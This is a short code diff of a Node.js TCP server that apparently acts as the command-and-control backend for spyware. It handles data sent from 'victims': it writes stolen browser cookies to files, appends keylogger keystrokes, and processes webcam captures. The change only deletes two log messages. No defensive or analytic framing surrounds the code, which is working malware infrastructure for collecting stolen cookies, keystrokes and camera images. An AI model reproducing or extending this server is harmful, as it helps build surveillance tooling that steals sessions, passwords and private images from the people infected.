@@ -18,14 +18,10 @@ var server = net.createServer(function(socket) {
         if (data[0] == "cookies") {
             fs.writeFile("data/cookies" + socket.socket_num, data[1], function(err) {
                 if (err) console.log(err);
-
-                console.log("Victim " + socket.socket_num + " cookies written to file");
             });
         } else if (data[0] == "keylogger") {
             fs.appendFile("data/keylogger" + socket.socket_num, data[1], function(err) {
                 if (err) console.log(err);
-
-                console.log("Key written to file");
             });
         } else if (data[0] == "web_cam_success") {
             var rawBuffer = Buffer.from(chunk, 'binary');
